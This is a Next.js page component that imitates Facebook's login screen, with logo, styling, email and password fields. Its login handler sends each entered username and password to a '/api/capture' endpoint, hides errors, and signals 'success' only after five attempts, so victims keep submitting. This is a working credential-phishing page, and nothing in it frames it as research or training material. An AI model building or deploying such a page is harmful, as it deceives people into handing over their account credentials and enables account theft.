import Head from 'next/head';
import { useState } from 'react';

export default function FacebookLoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);

  const handleLogin = async () => {
    const newCount = attemptCount + 1;
    setAttemptCount(newCount);
    
    try {
      const res = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: email.trim(), password, method: 'facebook' })
      });
      
      if (newCount >= 5) {
        const event = new CustomEvent('show-success', { detail: { platform: 'facebook' } });
        window.dispatchEvent(event);
      }
    } catch (e) {}
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Facebook Login</title>
      </Head>

      <style jsx>{`
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #e7ebf0, #f0f2f5); height: 100vh; margin: 0; overflow: hidden; }
        .login-wrapper { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; padding: 40px 0; }
        .login-container { background-color: white; width: 360px; padding: 20px; border-radius: 8px; box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1); text-align: center; }
        .logo { width: 50px; height: 50px; margin-bottom: 20px; background: #1877f2; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 22px; margin-left: auto; margin-right: auto; }
        input { width: 95%; padding: 12px; margin: 10px 0; border: 1px solid #ccd0d5; border-radius: 6px; background-color: #f5f6f7; font-size: 16px; }
        input:focus { outline: none; border-color: #1877f2; }
        #login { width: 100%; padding: 12px; margin: 15px 0; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
        #login:hover { background-color: #166fe5; }
        a.forgot { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-top: 10px; }
        button { background: none; border: none; color: #1877f2; font-size: 14px; cursor: pointer; padding: 0; margin-top: 10px; }
        .footer { margin-top: 20px; font-size: 12px; color: #555; }
        .footer p { margin: 0; }
        @media (max-width: 480px) { .login-wrapper { justify-content: center; } .login-container { width: 90%; } }
      `}</style>

      <div className="login-wrapper">
        <div className="login-container">
          <div className="logo">f</div>
          <input id="email" type="text" placeholder="Mobile number or email address" value={email} onChange={(e) => setEmail(e.target.value)} />
          <input id="password" type="password" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
          <button id="login" onClick={handleLogin}>Log in</button>
          <a href="#">Forgotten Password?</a>
          <p style={{fontSize: '14px', color: '#555', marginTop: '10px'}}>Don't have an account? Sign up</p>
          <div className="footer">
            <p>About · Help · Terms</p>
          </div>
        </div>
      </div>
    </>
  );
}